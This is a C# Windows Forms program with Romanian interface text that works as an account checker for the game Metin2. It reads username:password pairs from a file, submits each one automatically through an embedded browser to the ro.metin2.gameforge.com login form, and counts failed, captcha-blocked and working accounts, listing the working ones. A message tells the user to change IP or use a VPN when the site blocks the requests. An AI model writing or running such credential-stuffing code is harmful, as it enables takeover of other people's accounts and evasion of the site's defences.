using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace verifyCont
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            HtmlDocument doc1 = webBrowser1.Document;
            
                try
                {
                    string[] part = listBox1.SelectedItem.ToString().Split(':');

                    if (textBox1.Text.Contains("trenner"))
                    {
                        HtmlElement user = doc1.GetElementById("username");
                        HtmlElement pass = doc1.GetElementById("password");
                        HtmlElement send = doc1.GetElementById("submitBtn");

                        user.SetAttribute("value", part[0].ToString());
                        pass.SetAttribute("value", part[1].ToString());
                        send.InvokeMember("Click");
                    }
                    else
                    {
                        HtmlElement user = doc1.GetElementById("name");
                        HtmlElement pass = doc1.GetElementById("password");
                        HtmlElement send = doc1.GetElementById("submitBtnRight");

                        user.SetAttribute("value", part[0].ToString());
                        pass.SetAttribute("value", part[1].ToString());
                        send.InvokeMember("Click");
                    }
                }
                catch (Exception)
                {
                    timer1.Stop();
                    MessageBox.Show("Pagină albă! Schimbă IP-ul sau foloseşte VPN.");
                }
                try
                {
                    listBox1.SelectedIndex += 1;
                }
                catch (Exception)
                {
                    timer1.Stop();
                    MessageBox.Show("Toate conturile au fost verificate.");
                }
            }

        private void Form1_Load(object sender, EventArgs e)
        {
            webBrowser1.Navigate("https://ro.metin2.gameforge.com/");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {

                DialogResult dr = this.openFileDialog1.ShowDialog();
                string[] lines = System.IO.File.ReadAllLines(openFileDialog1.FileName);
                foreach (string line in lines)
                    listBox1.Items.Add(line);
                label3.Text = "Conturi încărcate: " + listBox1.Items.Count.ToString();
                listBox1.SelectedIndex = 0;
            }
            catch (Exception)
            {

            }
        }
        
        int wrong, captcha, good;
        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (webBrowser1.ReadyState != WebBrowserReadyState.Complete)
                return;
            textBox1.Text = webBrowser1.DocumentText;
            
            string start = "logout?__token=";
            int startindex = textBox1.Text.IndexOf(start);
            string token = textBox1.Text.Substring(startindex + 15, 32);
            textBox3.Text = "https://ro.metin2.gameforge.com:443/user/logout?__token=" + token;

            try
            {
                if (textBox1.Text.Contains("greşite."))
                {
                    wrong +=1;
                    label1.Text = "GREŞITE: " + wrong.ToString();
                }
                if (textBox1.Text.Contains("Confirma"))
                {
                    captcha +=1;
                    textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                    label2.Text = "CAPTCHA: " + captcha.ToString();
                }
                if (textBox1.Text.Contains("Obține MD"))
                {
                    good +=1;
                    textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                    label4.Text = "DIRECTE: " + good.ToString();
                    webBrowser1.Navigate(textBox3.Text);
                }
                if (textBox1.Text.Contains("întreţinere"))
                {
                    label6.Text = "MENTENANŢĂ: " + 1.ToString();
                }
            }
            catch (Exception)
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            webBrowser1.Navigate(textBox3.Text);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            label5.Text = "Conturi funcţionale: " + (textBox2.Lines.Count()-1);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            button1_Click(null, null);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            timer1.Stop();
        }
    }
}